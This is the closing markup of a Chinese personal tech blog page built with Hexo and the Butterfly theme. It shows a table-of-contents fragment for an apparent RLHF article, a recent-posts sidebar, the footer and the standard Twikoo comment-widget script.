class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.14.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8-RLHF%EF%BC%9F"><span class="toc-number">1.14.1.</span> <span class="toc-text">为什么要使用 RLHF？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E5%9E%8B%E7%9A%84%E7%86%B5"><span class="toc-number">1.14.2.</span> <span class="toc-text">模型的熵</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%95%E7%94%A8"><span class="toc-number">1.15.</span> <span class="toc-text">引用</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/252.html" title="Agent多工具超长上下文处理方案"><img src= "/img/loading.gif" data-lazy-src="https://42f2671d685f51e10fc6-b9fcecea3e50b3b59bdc28dead054ebc.ssl.cf5.rackcdn.com/illustrations/Bus_stop_8ib0.svg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Agent多工具超长上下文处理方案"/></a><div class="content"><a class="title" href="/posts/252.html" title="Agent多工具超长上下文处理方案">Agent多工具超长上下文处理方案</a><time datetime="2025-05-11T14:43:15.000Z" title="发表于 2025-05-11 22:43:15">2025-05-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/35873.html" title="beartype 运行时入参校验"><img src= "/img/loading.gif" data-lazy-src="https://42f2671d685f51e10fc6-b9fcecea3e50b3b59bdc28dead054ebc.ssl.cf5.rackcdn.com/illustrations/reminders_697p.svg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="beartype 运行时入参校验"/></a><div class="content"><a class="title" href="/posts/35873.html" title="beartype 运行时入参校验">beartype 运行时入参校验</a><time datetime="2025-03-25T23:08:07.000Z" title="发表于 2025-03-26 07:08:07">2025-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/25614.html" title="AI断片了吗？探秘大模型在超长对话中的理解能力"><img src= "/img/loading.gif" data-lazy-src="https://42f2671d685f51e10fc6-b9fcecea3e50b3b59bdc28dead054ebc.ssl.cf5.rackcdn.com/illustrations/fingerprint_swrc.svg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AI断片了吗？探秘大模型在超长对话中的理解能力"/></a><div class="content"><a class="title" href="/posts/25614.html" title="AI断片了吗？探秘大模型在超长对话中的理解能力">AI断片了吗？探秘大模型在超长对话中的理解能力</a><time datetime="2025-03-10T00:02:00.000Z" title="发表于 2025-03-10 08:02:00">2025-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/33210.html" title="个人免签方案"><img src= "/img/loading.gif" data-lazy-src="https://42f2671d685f51e10fc6-b9fcecea3e50b3b59bdc28dead054ebc.ssl.cf5.rackcdn.com/illustrations/creative_thinking_b3bc.svg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="个人免签方案"/></a><div class="content"><a class="title" href="/posts/33210.html" title="个人免签方案">个人免签方案</a><time datetime="2025-01-16T02:33:24.000Z" title="发表于 2025-01-16 10:33:24">2025-01-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/60917.html" title="GPT学习分享"><img src= "/img/loading.gif" data-lazy-src="https://42f2671d685f51e10fc6-b9fcecea3e50b3b59bdc28dead054ebc.ssl.cf5.rackcdn.com/illustrations/High_five_u364.svg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="GPT学习分享"/></a><div class="content"><a class="title" href="/posts/60917.html" title="GPT学习分享">GPT学习分享</a><time datetime="2024-03-07T03:14:02.000Z" title="发表于 2024-03-07 11:14:02">2024-03-07</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By Daoji</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo 5.4.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.3</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://daoji-twikoo.netlify.app/.netlify/functions/twikoo',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const init = (el = document, path = location.pathname) => {
+    twikoo.init({
+      el: el.querySelector('#twikoo-wrap'),
+      envId: 'https://daoji-twikoo.netlify.app/.netlify/functions/twikoo',
+      region: '',
+      onCommentLoaded: () => {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      },
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    
+
+    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
+      if (el.children.length) {
+        el.innerHTML = ''
+        el.classList.add('no-comment')
+      }
+    })
+  }
+
+  const loadTwikoo = (el, path) => {
+    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
+    else btf.getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(() => init(el, path))
+  }
+
+  if (isShuoshuo) {
+    'Twikoo' === 'Twikoo'
+      ? window.shuoshuoComment = { loadComment: loadTwikoo }
+      : window.loadOtherComment = loadTwikoo
+    return
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
